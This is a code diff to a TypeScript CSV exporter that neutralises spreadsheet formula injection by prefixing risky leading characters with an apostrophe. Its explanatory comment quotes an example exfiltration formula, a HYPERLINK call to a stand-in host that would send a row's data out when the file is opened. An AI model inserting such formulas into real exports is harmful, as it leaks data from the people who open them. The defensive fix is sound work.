@@ -102,11 +102,26 @@ export function parseCsvRecords(text: string): CsvRecord[] {
   );
 }
 
-/** RFC-4180 field: quote when it holds a comma, quote, CR or LF; double embedded quotes. */
+/**
+ * RFC-4180 field: quote when it holds a comma, quote, CR or LF; double embedded quotes.
+ *
+ * WEBB-2 — and a cell is data, never a formula.
+ *
+ * Every export here is made of text somebody typed into the app: a customer name, a depot
+ * name, a note on an order. Excel and Sheets RUN a cell that starts with `=`, `+`, `-` or
+ * `@`, so `=HYPERLINK("http://x",A1)` sitting in a name field posts that row to somebody
+ * else's server the moment a manager opens the file — no macros needed, and the person who
+ * opens an export is usually the one with the most access.
+ *
+ * A leading apostrophe is the neutraliser every spreadsheet understands: the cell shows what
+ * was typed and evaluates nothing. Tab and CR get it too, because a reader that trims
+ * leading whitespace turns a tabbed formula back into a formula.
+ */
 function escapeCell(value: CsvCell): string {
   if (value == null) return '';
   const s = String(value);
-  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+  const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
 }
 
 /** Build a CSV document (CRLF line endings) from a header row + data rows. */
